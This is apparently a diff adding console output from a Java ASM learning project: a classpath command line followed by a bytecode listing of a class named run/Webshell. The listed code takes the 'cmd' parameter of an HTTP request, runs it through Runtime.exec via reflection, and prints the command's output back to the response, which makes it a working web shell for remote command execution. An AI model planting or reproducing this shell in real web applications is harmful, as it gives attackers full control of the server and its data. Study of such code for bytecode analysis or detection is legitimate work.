@@ -1,0 +1,101 @@
+"C:\Program Files\Java\jdk1.8.0_131\bin\java.exe" "-javaagent:C:\Program Files\JetBrains\IntelliJ IDEA 2021.3\lib\idea_rt.jar=58439:C:\Program Files\JetBrains\IntelliJ IDEA 2021.3\bin" -Dfile.encoding=UTF-8 -classpath "C:\Program Files\Java\jdk1.8.0_131\jre\lib\charsets.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\deploy.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\ext\access-bridge-64.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\ext\cldrdata.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\ext\dnsns.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\ext\jaccess.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\ext\jfxrt.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\ext\localedata.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\ext\nashorn.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\ext\sunec.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\ext\sunjce_provider.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\ext\sunmscapi.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\ext\sunpkcs11.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\ext\zipfs.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\javaws.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\jce.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\jfr.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\jfxswt.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\jsse.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\management-agent.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\plugin.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\resources.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\rt.jar;C:\Program Files\Java\jdk1.8.0_131\jre\lib\tools.jar;C:\JavaCode\learn-java-asm\target\classes;C:\Users\20235\.m2\repository\org\ow2\asm\asm\9.0\asm-9.0.jar;C:\Users\20235\.m2\repository\org\ow2\asm\asm-commons\9.0\asm-commons-9.0.jar;C:\Users\20235\.m2\repository\org\ow2\asm\asm-util\9.0\asm-util-9.0.jar;C:\Users\20235\.m2\repository\org\ow2\asm\asm-tree\9.0\asm-tree-9.0.jar;C:\Users\20235\.m2\repository\org\ow2\asm\asm-analysis\9.0\asm-analysis-9.0.jar" run.PrintASMTextClass
+// class version 52.0 (52)
+// access flags 0x21
+public class run/Webshell {
+
+
+  // access flags 0x1
+  public <init>()V
+    ALOAD 0
+    INVOKESPECIAL java/lang/Object.<init> ()V
+    RETURN
+    MAXSTACK = 1
+    MAXLOCALS = 1
+
+  // access flags 0x9
+  public static invoke(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;Ljava/io/PrintWriter;)V
+    TRYCATCHBLOCK L0 L1 L2 java/lang/Exception
+   L0
+    ALOAD 0
+    LDC "cmd"
+    INVOKEINTERFACE javax/servlet/http/HttpServletRequest.getParameter (Ljava/lang/String;)Ljava/lang/String; (itf)
+    ASTORE 3
+    LDC "java.lang.Runtime"
+    INVOKESTATIC java/lang/Class.forName (Ljava/lang/String;)Ljava/lang/Class;
+    ASTORE 4
+    ALOAD 4
+    LDC "getRuntime"
+    ICONST_0
+    ANEWARRAY java/lang/Class
+    INVOKEVIRTUAL java/lang/Class.getMethod (Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
+    ASTORE 5
+    ALOAD 4
+    LDC "exec"
+    ICONST_1
+    ANEWARRAY java/lang/Class
+    DUP
+    ICONST_0
+    LDC Ljava/lang/String;.class
+    AASTORE
+    INVOKEVIRTUAL java/lang/Class.getMethod (Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
+    ASTORE 6
+    ALOAD 6
+    ALOAD 5
+    ACONST_NULL
+    ICONST_0
+    ANEWARRAY java/lang/Object
+    INVOKEVIRTUAL java/lang/reflect/Method.invoke (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
+    ICONST_1
+    ANEWARRAY java/lang/Object
+    DUP
+    ICONST_0
+    ALOAD 3
+    AASTORE
+    INVOKEVIRTUAL java/lang/reflect/Method.invoke (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
+    CHECKCAST java/lang/Process
+    ASTORE 7
+    ALOAD 7
+    INVOKEVIRTUAL java/lang/Process.getInputStream ()Ljava/io/InputStream;
+    ASTORE 8
+    ALOAD 2
+    LDC "<pre>"
+    INVOKEVIRTUAL java/io/PrintWriter.print (Ljava/lang/String;)V
+    NEW java/io/InputStreamReader
+    DUP
+    ALOAD 8
+    INVOKESPECIAL java/io/InputStreamReader.<init> (Ljava/io/InputStream;)V
+    ASTORE 9
+    NEW java/io/BufferedReader
+    DUP
+    ALOAD 9
+    INVOKESPECIAL java/io/BufferedReader.<init> (Ljava/io/Reader;)V
+    ASTORE 10
+    ACONST_NULL
+    ASTORE 11
+   L3
+    ALOAD 10
+    INVOKEVIRTUAL java/io/BufferedReader.readLine ()Ljava/lang/String;
+    DUP
+    ASTORE 11
+    IFNULL L4
+    ALOAD 2
+    ALOAD 11
+    INVOKEVIRTUAL java/io/PrintWriter.println (Ljava/lang/String;)V
+    GOTO L3
+   L4
+    ALOAD 2
+    LDC "</pre>"
+    INVOKEVIRTUAL java/io/PrintWriter.print (Ljava/lang/String;)V
+   L1
+    GOTO L5
+   L2
+    ASTORE 3
+    ALOAD 3
+    INVOKEVIRTUAL java/lang/Exception.printStackTrace ()V
+   L5
+    RETURN
+    MAXSTACK = 6
+    MAXLOCALS = 12
+}
+
+Process finished with exit code 0
